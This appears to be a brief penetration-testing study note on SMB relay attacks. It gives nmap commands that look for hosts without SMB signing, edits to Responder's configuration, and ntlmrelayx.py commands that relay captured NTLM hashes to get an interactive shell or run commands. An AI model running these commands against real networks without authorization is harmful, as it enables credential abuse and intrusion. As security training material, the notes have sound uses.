# SMB Relay

What is SMB Relay: Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access

Requirements

SMB signing must be disabled or not enforced on the target

relayed user credentials must be admin on machine for any real value



nmap --script=smb2-security-mode.nse -p445 ipaddress /can scan entire network



nmap --script=smb2-security-mode.nse -p445 192.168.117.0/24 -Pn

can use nessus



edit responder



sudo mousepad /etc/responder/Responder.conf

turn them off SMB and HTTP



ntlmrelayx.py -tf targets.txt -smb2support



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

get terminal access

ntlmrelayx.py -tf targets.txt -smb2support -i

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Can also execute commands through this



ntlmrelayx.py -tf targets.txt -smb2support -c "command"
